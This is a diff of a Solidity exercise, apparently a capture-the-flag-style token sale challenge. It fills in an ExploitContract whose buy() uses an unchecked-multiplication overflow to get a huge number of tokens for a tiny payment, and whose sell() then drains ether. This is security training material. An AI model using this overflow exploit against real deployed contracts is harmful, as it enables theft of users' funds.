@@ -1,5 +1,6 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
+import "forge-std/Test.sol";
 
 contract TokenSale {
     mapping(address => uint256) public balanceOf;
@@ -18,7 +19,8 @@ contract TokenSale {
         unchecked {
             total += numTokens * PRICE_PER_TOKEN;
         }
-        require(msg.value == total);
+        console.log("total: ",total);
+        require(msg.value == total, "wrong amount");
 
         balanceOf[msg.sender] += numTokens;
         return (total);
@@ -39,6 +41,18 @@ contract ExploitContract {
 
     constructor(TokenSale _tokenSale) {
         tokenSale = _tokenSale;
+    }
+
+    function buy() public payable {
+        uint256 numTokens;
+        unchecked {
+            numTokens = (type(uint256).max / (1 ether)) + 1;
+        }
+        tokenSale.buy{value: 415992086870360064}(numTokens);
+    }
+
+    function sell() public payable {
+        tokenSale.sell(1);
     }
 
     receive() external payable {}
